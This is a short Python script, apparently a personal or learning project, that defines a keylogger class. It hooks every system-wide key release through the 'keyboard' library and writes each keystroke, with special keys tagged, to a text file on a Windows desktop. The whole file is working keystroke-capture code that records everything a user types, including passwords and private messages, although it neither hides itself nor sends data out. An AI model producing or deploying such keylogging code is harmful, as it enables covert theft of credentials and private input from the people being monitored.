import keyboard

class KeyLogger:
    def __init__(self, output="C:\\Users\\yehon\\Desktop\\keylog.txt"):
        self.__output = open(output, 'w', encoding='utf-8')

    def startLog(self):
        keyboard.on_release(callback=self.write)
        keyboard.wait()

    def write(self, event):
        key = event.name

        # Handle special keys for better readability
        if key == 'space':
            self.__output.write(' ')
        elif key == 'enter':
            self.__output.write('\n')
        elif key == 'tab':
            self.__output.write('\t')
        elif key == 'backspace':
            self.__output.write('[BACKSPACE]')
        elif len(key) > 1:  # Handles things like shift, ctrl, etc.
            self.__output.write(f'[{key.upper()}]')
        else:
            self.__output.write(key)

        self.__output.flush()


k = KeyLogger()
k.startLog()